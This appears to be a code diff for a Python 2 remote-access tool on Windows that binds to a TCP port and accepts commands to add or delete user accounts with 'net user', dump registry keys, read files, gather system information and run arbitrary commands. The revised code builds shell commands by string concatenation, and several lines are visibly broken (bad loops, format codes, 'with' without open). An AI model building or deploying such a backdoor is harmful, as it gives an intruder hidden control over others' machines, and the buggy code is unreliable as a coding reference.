@@ -51,33 +51,35 @@ def send_data(sock,data):
     sock.send(data)
     return
 
-def create_user(name,pwd, log_file):
-    cmd_list = ["net",
-                "user",
-                "/add",
-                name,
-                pwd]
-    subprocess.Popen(cmd_list, 0 , None, None, log_file, log_file)
-    log_file.close()
-    with open(log_file, "r") as f:
-        data = f.read()
+def create_user(name, pwd):
+    # cmd_list = ["net",
+    #             "user",
+    #             "/add",
+    #             name,
+    #             pwd]
+    # subprocess.Popen(cmd_list, 0 , None, None, log_file, log_file)
+    # log_file.close()
+    # with open(log_file, "r") as f:
+    #     data = f.read()
+    # return data
+    subprocess.Popen("net user /add " + name + " " + pwd)
+    return
 
-    return data
-
-def delete_user(name, log_file):
-    cmd_list = ["net",
-                "user",
-                "/del",
-                name]
-    subprocess.Popen(cmd_list, 0, None, None, log_file, log_file)
-    log_file.close()
-    with(log_file, "r") as f:
-        data = f.read()
-    return data
+def delete_user(name):
+    # cmd_list = ["net",
+    #             "user",
+    #             "/del",
+    #             name]
+    # subprocess.Popen(cmd_list, 0, None, None, log_file, log_file)
+    # log_file.close()
+    # with(log_file, "r") as f:
+    #     data = f.read()
+    # return data
+    subprocess.Popen("net user /del " + name)
 
 def download_registry_key(root, path, sock):
-	root_dict = {"HKEY_CLASSES_ROOT" : HKEYY_CLASSES_ROOT,
-				 "HKEY_CURRENT_USER" : HKEYY_CURRENT_USER,
+	root_dict = {"HKEY_CLASSES_ROOT" : HKEY_CLASSES_ROOT,
+				 "HKEY_CURRENT_USER" : HKEY_CURRENT_USER,
 				 "HKEY_LOCAL_MACHINE" : HKEY_LOCAL_MACHINE,
 				 "HKEY_USERS" : HKEY_USERS,
 				 "HKEY_CURRENT_CONFIG": HKEY_CURRENT_CONFIG}
@@ -87,7 +89,7 @@ def download_registry_key(root, path, sock):
 	num_subkeys, num_values, l_modified = QueryInfoKey(key_hdl)
 	send_data(sock, "SUBLEYS: %D\nVALUES: %d\n" % (num_subkeys, num_values))
 
-	send_data(sock, print "=========================SUBKEYS=========================")
+	send_data(sock, "=========================SUBKEYS=========================")
 	for i in num_subkeys:
 		send_data(sock, EnumKey(key_hdl, i))
 	send_data(sock, "=========================VALUES=========================")
@@ -97,7 +99,7 @@ def download_registry_key(root, path, sock):
 	send_data(sock, "DATA COMPLETE")
 	return
 
-def download_file(file_name,sock):
+def download_file(file_name, sock):
 	with(file_name, "r") as f:
 		print f.read()
 	return
@@ -118,39 +120,37 @@ def gather_information(log_name,sock):
 	send_data(sock, "Log created" + f)
 	return
     
-def execute_command(cmd, log):
-	with open(log, "w") as f:
-		try:
-			subprocess.Popen(cmd, 0, None, None, f, f)
-		except WindowsError:
-			subprocess.Popen(cmd+ ".com", 0, None, None, f, f)
-	return
+def execute_command(cmd):
+    try:
+        running_command = subprocess.Popen(cmd)
+    except WindowsError:
+        subprocess.Popen(cmd+ ".com")
+    subprocess.terminate(running_command)
+    return
     
 def get_data(sock, str_to_send):
 	send_data(sock, str_to_send)
 	return recv_data(sock)
 
 def main():
-	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	sock.bind(("", 55555))
-	sock.listen(1)
-	conn_sock, conn_info = sock.accept()
-	with open("err.log", "w") as error_log:
-		while True:
-			cmd = get_data(conn_sock, "COMMAND: ")
-			if cmd == "CU":
-				create_user(get_data(conn_sock, "Username: "), get_data(conn_sock, "Password: "))
-
-			elif cmd == "DU":
-				delete_user(get_data(conn_sock, "Username: "), error_log)
-			elif cmd == "DRK":
-				download_registry_key(get_data(conn_sock, "Root"), get_data(conn_sock, "Path"), conn_sock)
-			elif cmd == "DF":
-				download_file(get_data(conn_sock, "Filename"), conn_sock)
-			elif cmd == "GI":
-				gather_information(get_data(conn_sock, "Log name: "), conn_sock)
-			elif cmd == "EC":
-				execute_command(get_data(conn_sock, "Command: "), get_data(conn_sock, "Log Name: "))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind(("", 12345))
+    sock.listen(1)
+    conn_sock, conn_info = sock.accept()
+    while True:
+        cmd = get_data(conn_sock, "COMMAND: ")
+        if cmd == "CU":
+            create_user(get_data(conn_sock, "Username: "), get_data(conn_sock, "Password: "))
+        elif cmd == "DU":
+            delete_user(get_data(conn_sock, "Username: "))
+        elif cmd == "DRK":
+            download_registry_key(get_data(conn_sock, "Root"), get_data(conn_sock, "Path"), conn_sock)
+        elif cmd == "DF":
+            download_file(get_data(conn_sock, "Filename"), conn_sock)
+        elif cmd == "GI":
+            gather_information(get_data(conn_sock, "Log name: "), conn_sock)
+        elif cmd == "EC":
+            execute_command(get_data(conn_sock, "Command: "))
 
 	return
     
